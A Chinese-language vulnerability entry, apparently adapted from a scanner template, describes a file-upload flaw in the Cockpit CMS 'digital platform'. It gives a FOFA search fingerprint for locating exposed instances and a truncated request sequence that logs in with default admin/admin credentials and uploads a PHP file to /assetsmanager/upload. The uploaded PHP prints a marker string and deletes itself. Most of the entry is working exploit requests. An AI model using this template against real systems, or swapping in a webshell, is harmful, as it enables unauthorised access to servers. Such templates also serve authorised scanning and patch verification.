# cockpit数字平台upload文件上传漏洞

- **系统**：cockpit　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="Authenticate Please!"`
- **请求**：`GET /auth/login?to=/ HTTP/1.1`
- **关键头**：`id: cockpit-shuzi-upload-fileupload`　`name: cockpit-shuzi-upload-fileupload`　`author: HackTwo`　`severity: high`　`description: cockpit 数字平台 upload 存在文件上传漏洞。`　`tags: cockpit,fileupload`　`fofa-qeury: title="Authenticate Please!"`

**请求体 / payload**
```
- raw:
-
Host:
-
POST /auth/check HTTP/1.1
Host:
Content-Type: application/json
{"auth":{"user":"admin","password":"admin"},"csfr":"{{csrf}}"}
-
POST /assetsmanager/upload HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
Cookie: {{cookie}}
-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="files[]"; filename="BE1a3d.php"
Content-Type: text/php
<?php echo "1a6534222cFd04e8";unlink(__FILE__);?>
-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="folder"
-------------…（脚本共 1160 字，完整版见原文）
```